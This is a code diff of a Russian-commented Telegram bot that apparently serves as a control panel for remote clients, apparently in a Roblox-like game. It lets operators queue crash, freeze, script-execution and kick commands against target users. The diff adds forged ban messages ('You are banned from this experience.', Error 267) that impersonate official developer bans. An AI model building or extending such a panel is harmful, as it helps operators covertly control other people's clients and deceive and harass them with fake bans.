@@ -21,8 +21,8 @@ SEMI_ADMINS = [int(admin_id.strip()) for admin_id in SEMI_ADMINS_STR.split(',') 
 TELEGRAM_CHAT_ID = FULL_ADMINS[0] if FULL_ADMINS else None
 
 # === УДОБНАЯ НАСТРОЙКА ПРАВ ДЛЯ SEMI_ADMINS ===
-# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, reset, execselect, crash
-SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,reset')
+# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, fakebandefault, fakeban267, reset, execselect, crash
+SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,fakebandefault,fakeban267,reset')
 SEMI_PERMS = [p.strip() for p in SEMI_PERMS_STR.split(',') if p.strip()]
 
 # --- НАСТРОЙКИ GITHUB DB ---
@@ -221,7 +221,7 @@ def telegram_webhook():
             btn_action, target_user = parts
             
             # --- 🛡️ УНИВЕРСАЛЬНАЯ ПРОВЕРКА ПРАВ НА ДЕЙСТВИЯ ---
-            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban"]
+            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban", "fakebandefault", "fakeban267"]
             if btn_action in protected_actions:
                 if not is_full_admin and btn_action not in SEMI_PERMS:
                     answer_callback(callback_id, "⛔ У вас нет прав на это действие!", show_alert=True)
@@ -285,18 +285,22 @@ def telegram_webhook():
 
             # 6. Kick Handling (Тоже динамическое!)
             elif btn_action == "kick":
-                awaiting_reason[user_id] = target_user
+                awaiting_reason.pop(user_id, None)
                 
                 def can_use(action): return is_full_admin or action in SEMI_PERMS
                 
                 kick_btns = []
                 if can_use("defaultkick"):
                     kick_btns.append([{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}])
+                if can_use("fakeban267"):
+                    kick_btns.append([{"text": "⛔ Fake Ban (Error 267)", "callback_data": f"fakeban267_{target_user}"}])
+                if can_use("fakebandefault"):
+                    kick_btns.append([{"text": "⛔ Fake Ban (Error 600 - Дефолт UI)", "callback_data": f"fakebandefault_{target_user}"}])
                 if can_use("fakeban"):
-                    kick_btns.append([{"text": "⛔ Fake Ban (Error 600)", "callback_data": f"fakeban_{target_user}"}])
+                    kick_btns.append([{"text": "⛔ Fake Ban (Error 600 - Custom UI)", "callback_data": f"fakeban_{target_user}"}])
                 
                 keyboard = {"inline_keyboard": kick_btns}
-                send_telegram_message(chat_id, f"Напиши причину кика для {target_user} или выбери шаблон:", reply_markup=keyboard)
+                send_telegram_message(chat_id, f"Напиши причину кика для <b>{target_user}</b> или выбери шаблон:", reply_markup=keyboard, parse_mode="HTML")
 
             elif btn_action == "defaultkick":
                 awaiting_reason.pop(user_id, None)
@@ -304,6 +308,16 @@ def telegram_webhook():
                 if target_user not in commands_queue: commands_queue[target_user] = []
                 commands_queue[target_user].append(action)
                 answer_callback(callback_id, f"✅ {target_user} кикнут (дефолт).")
+
+            elif btn_action == "fakeban267":
+                awaiting_reason.pop(user_id, None)
+                # Стандартный текст перманентного бана от разработчика
+                kick_msg = "You are banned from this experience."
+                action = f"/kick_{kick_msg}"
+                
+                if target_user not in commands_queue: commands_queue[target_user] = []
+                commands_queue[target_user].append(action)
+                answer_callback(callback_id, f"✅ {target_user} отлетел с классическим баном (Error 267).", show_alert=True)
 
             elif btn_action == "fakeban":
                 awaiting_reason.pop(user_id, None)
